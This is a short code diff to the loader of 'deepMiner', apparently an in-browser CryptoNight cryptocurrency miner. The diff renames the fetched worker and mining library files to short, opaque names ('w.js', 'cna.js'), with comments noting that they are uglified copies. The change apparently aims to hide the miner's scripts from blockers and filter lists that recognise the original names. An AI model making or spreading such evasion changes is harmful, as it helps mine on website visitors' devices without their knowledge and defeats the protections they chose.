@@ -66,7 +66,7 @@
                 this._asmjsStatus = "loaded";
                 this._startNow()
             }.bind(this), xhr);
-            xhr.open("get", "/worker.js", true);
+            xhr.open("get", "/w.js", true); /*its uglified worker.js*/
             xhr.send()
         } else if (this._asmjsStatus === "unloaded") {
             this._asmjsStatus = "pending";
@@ -75,7 +75,7 @@
                 this._asmjsStatus = "loaded";
                 this._startNow()
             }.bind(this), xhr);
-            xhr.open("get", deepMiner.CONFIG.LIB_URL + "cryptonight-asmjs.min.js", true);
+            xhr.open("get", deepMiner.CONFIG.LIB_URL + "cna.js", true); /*its uglified cryptonight-asmjs.js*/
             xhr.send()
         }
     };
